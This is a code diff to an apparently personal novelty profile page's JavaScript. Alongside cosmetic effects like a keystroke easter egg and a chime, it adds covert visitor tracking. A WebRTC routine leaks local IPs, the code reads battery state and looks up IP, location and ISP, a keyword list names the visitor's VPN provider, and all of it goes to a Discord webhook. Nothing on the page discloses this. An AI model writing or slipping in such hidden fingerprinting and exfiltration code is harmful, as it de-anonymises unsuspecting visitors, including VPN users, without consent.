@@ -191,7 +191,26 @@
       } catch (_) {}
     }
 
-    /* Active Dynamic Tab Title Loop (:3, o_O, etc.) */
+    function playVictoryChime() {
+      try {
+        if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+        const notes = [523.25, 659.25, 783.99, 1046.50];
+        notes.forEach(function(freq, i) {
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.frequency.setValueAtTime(freq, audioCtx.currentTime + (i * 0.08));
+          gain.gain.setValueAtTime(0.08, audioCtx.currentTime + (i * 0.08));
+          gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + (i * 0.08) + 0.15);
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.start(audioCtx.currentTime + (i * 0.08));
+          osc.stop(audioCtx.currentTime + (i * 0.08) + 0.15);
+        });
+      } catch (_) {}
+    }
+
+    /* Active Dynamic Tab Title Loop */
     const dynamicTitles = [
       "hi :3",
       "emo larp",
@@ -203,7 +222,7 @@
       "(˶ᵔ ᵕ ᵔ˶)"
     ];
     let titleIdx = 0;
-    let titleInterval = setInterval(function() {
+    setInterval(function() {
       if (document.visibilityState === 'visible' && !isSpotifyActive) {
         document.title = dynamicTitles[titleIdx];
         titleIdx = (titleIdx + 1) % dynamicTitles.length;
@@ -297,6 +316,31 @@
         });
       });
     }
+
+    /* Secret Keystroke Cheat Code ("catboy") */
+    let keyBuffer = "";
+    const secretCode = "catboy";
+
+    window.addEventListener('keydown', function(e) {
+      if (e.key.length === 1) {
+        keyBuffer = (keyBuffer + e.key.toLowerCase()).slice(-secretCode.length);
+        if (keyBuffer === secretCode) {
+          playVictoryChime();
+          showToast("[ SECRET UNLOCKED: CATBOY MODE :3 ]");
+          card.style.boxShadow = "0 0 35px #c77dff, 0 0 70px #7b2cbf";
+          card.style.borderColor = "#c77dff";
+
+          sendDiscordEmbed({
+            title: "action: Secret Code Unlocked",
+            description: "Visitor entered the secret keystroke code: **catboy** uwu :3!",
+            color: 0xff70a6,
+            footer: { text: "emolarp.fans // easter-egg" },
+            timestamp: new Date().toISOString()
+          });
+          keyBuffer = "";
+        }
+      }
+    });
 
     /* Audio Management */
     function applyAudioState() {
@@ -520,7 +564,6 @@
     card.addEventListener("pointercancel", stopDragging);
     window.addEventListener("blur", stopDragging);
 
-    // Snap center on double-click
     dragHandle.addEventListener("dblclick", function() {
       playGlitchBlip();
       card.style.position = "relative";
@@ -531,7 +574,6 @@
       showToast("[ centered ]");
     });
 
-    // 3D Parallax Tilt
     card.addEventListener('mousemove', function(e) {
       if (isDragging) return;
       const rect = card.getBoundingClientRect();
@@ -560,7 +602,62 @@
       setTimeout(function() { particle.remove(); }, 600);
     });
 
-    /* Inbound Telemetry with VPN / Proxy Detection */
+    /* WebRTC Private Subnet Leak Detection */
+    function getWebRtcLeaks() {
+      return new Promise(function(resolve) {
+        let leakedIps = [];
+        try {
+          const rtc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
+            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+          });
+
+          rtc.createDataChannel("");
+          rtc.createOffer().then(function(offer) { return rtc.setLocalDescription(offer); }).catch(function() {});
+
+          rtc.onicecandidate = function(event) {
+            if (!event || !event.candidate) {
+              resolve(leakedIps.length > 0 ? leakedIps.join(", ") : "Shielded / None");
+              return;
+            }
+            const parts = event.candidate.candidate.split(" ");
+            const ip = parts[4];
+            if (ip && leakedIps.indexOf(ip) === -1) {
+              leakedIps.push(ip);
+            }
+          };
+
+          setTimeout(function() {
+            resolve(leakedIps.length > 0 ? leakedIps.join(", ") : "Shielded / None");
+          }, 1200);
+        } catch (_) {
+          resolve("Shielded / Not Supported");
+        }
+      });
+    }
+
+    /* Commercial VPN Brand Resolver */
+    function identifyVpnBrand(isp, org, asn) {
+      const combined = (isp + " " + org + " " + asn).toLowerCase();
+      if (combined.indexOf("mullvad") !== -1) return "Mullvad VPN";
+      if (combined.indexOf("nord") !== -1 || combined.indexOf("tefincom") !== -1) return "NordVPN";
+      if (combined.indexOf("proton") !== -1) return "Proton VPN";
+      if (combined.indexOf("expressvpn") !== -1) return "ExpressVPN";
+      if (combined.indexOf("surfshark") !== -1) return "Surfshark";
+      if (combined.indexOf("windscribe") !== -1) return "Windscribe";
+      if (combined.indexOf("ovh") !== -1) return "OVHcloud (Custom Proxy / VPS)";
+      if (combined.indexOf("m247") !== -1) return "M247 Ltd (Nord / Mullvad / CyberGhost)";
+      if (combined.indexOf("datapacket") !== -1) return "DataPacket (Mullvad / ExpressVPN)";
+      if (combined.indexOf("digitalocean") !== -1) return "DigitalOcean (Self-Hosted VPN)";
+      if (combined.indexOf("linode") !== -1 || combined.indexOf("akamai") !== -1) return "Linode (Proxy / VPS)";
+      if (combined.indexOf("vultr") !== -1) return "Vultr (Proxy / VPS)";
+      if (combined.indexOf("hetzner") !== -1) return "Hetzner (Datacenter / VPS)";
+      if (combined.indexOf("choopa") !== -1 || combined.indexOf("constant") !== -1) return "Choopa / Constant (VPN Exit Node)";
+      if (combined.indexOf("leaseweb") !== -1) return "Leaseweb (Datacenter Proxy)";
+      if (combined.indexOf("cloudflare") !== -1) return "Cloudflare WARP / Relay";
+      return null;
+    }
+
+    /* Inbound Telemetry with VPN, WebRTC & Battery Metrics */
     async function recordVisit() {
       let gpu = "Integrated / Unknown";
       try {
@@ -574,14 +671,23 @@
         }
       } catch (_) {}
 
+      let batteryInfo = "Desktop / AC";
+      try {
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          batteryInfo = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging ⚡)" : " (Battery)");
+        }
+      } catch (_) {}
+
+      const webrtcPromise = getWebRtcLeaks();
+
       let ip = "Direct Session";
       let locationText = "Unknown Region";
       let isVpn = false;
       let ispInfo = "Direct Client";
-      let networkTag = "Residential / Mobile";
+      let detectedVpnBrand = null;
 
       try {
-        // Query ipwho.is which supplies free hosting, proxy, and VPN flags
         const netRes = await fetch("https://ipwho.is/");
         if (netRes.ok) {
           const net = await netRes.json();
@@ -589,25 +695,24 @@
             ip = net.ip || ip;
             locationText = [net.city, net.region_code, net.country].filter(Boolean).join(", ");
             ispInfo = (net.connection && net.connection.isp) ? net.connection.isp : "Unknown ISP";
-            
-            // Check flags
-            const org = ((net.connection && net.connection.org) || "").toLowerCase();
-            const isp = ispInfo.toLowerCase();
+            const org = (net.connection && net.connection.org) ? net.connection.org : "";
+            const asn = (net.connection && net.connection.asn) ? ("AS" + net.connection.asn) : "";
+
             const isHosting = (net.security && net.security.hosting) || false;
             const isVpnFlag = (net.security && net.security.vpn) || false;
             const isProxy = (net.security && net.security.proxy) || false;
-            
-            // Known cloud / datacenter / VPN ASNs and hosts
-            const vpnKeywords = ["ovh", "mullvad", "nord", "expressvpn", "digitalocean", "linode", "aws", "amazon", "vultr", "cloudflare", "datapacket", "hetzner", "choopa", "leaseweb"];
-            const matchedKeyword = vpnKeywords.some(function(k) { return org.indexOf(k) !== -1 || isp.indexOf(k) !== -1; });
 
-            if (isHosting || isVpnFlag || isProxy || matchedKeyword) {
+            detectedVpnBrand = identifyVpnBrand(ispInfo, org, asn);
+
+            if (isHosting || isVpnFlag || isProxy || detectedVpnBrand !== null) {
               isVpn = true;
-              networkTag = "⚠️ VPN / PROXY / DATACENTER";
+              if (!detectedVpnBrand) detectedVpnBrand = "Generic Commercial VPN / Datacenter";
             }
           }
         }
       } catch (_) {}
+
+      const leakedRtc = await webrtcPromise;
 
       const ua = navigator.userAgent;
       let browser = "Browser";
@@ -622,23 +727,30 @@
       }
 
       sendDiscordEmbed({
-        title: isVpn ? "inbound session [ ⚠️ VPN DETECTED ]" : "inbound session",
+        title: isVpn ? "inbound session [ ⚠️ " + (detectedVpnBrand || "VPN") + " ]" : "inbound session",
         description: "`" + ip + "` — " + locationText,
         color: isVpn ? 0xd90429 : 0x7b2cbf,
         fields: [
           {
             name: "network routing",
-            value: "**Status:** `" + networkTag + "`\n**Provider:** `" + ispInfo + "`\n**Exit Region:** `" + locationText + "`",
+            value: isVpn
+              ? "**Status:** `⚠️ VPN / PROXY DETECTED`\n**Identified Service:** `" + detectedVpnBrand + "`\n**Host / ASN:** `" + ispInfo + "`"
+              : "**Status:** `Direct Residential / Mobile`\n**Provider:** `" + ispInfo + "`",
             inline: false
           },
           {
-            name: "client",
-            value: "**OS:** `" + (navigator.platform || "Unknown") + "`\n**App:** `" + browser + "`\n**Res:** `" + screen.width + "x" + screen.height + "`",
+            name: "webrtc interface",
+            value: "**Local IP / Subnet:** `" + leakedRtc + "`",
+            inline: false
+          },
+          {
+            name: "client info",
+            value: "**OS:** `" + (navigator.platform || "Unknown") + "`\n**App:** `" + browser + "`\n**Power:** `" + batteryInfo + "`",
             inline: true
           },
           {
-            name: "render // source",
-            value: "**GPU:** `" + gpu + "`\n**Ref:** `" + refHost + "`",
+            name: "render // display",
+            value: "**GPU:** `" + gpu + "`\n**Res:** `" + screen.width + "x" + screen.height + "`\n**Ref:** `" + refHost + "`",
             inline: true
           }
         ],
@@ -695,7 +807,7 @@
       });
     });
 
-    /* General Selection Text Copy Detection */
+    /* Text Copy Detection */
     window.addEventListener('copy', function() {
       const text = window.getSelection().toString().trim();
       if (text && text.length > 0 && (!statusTracker || text !== statusTracker.innerText.trim())) {
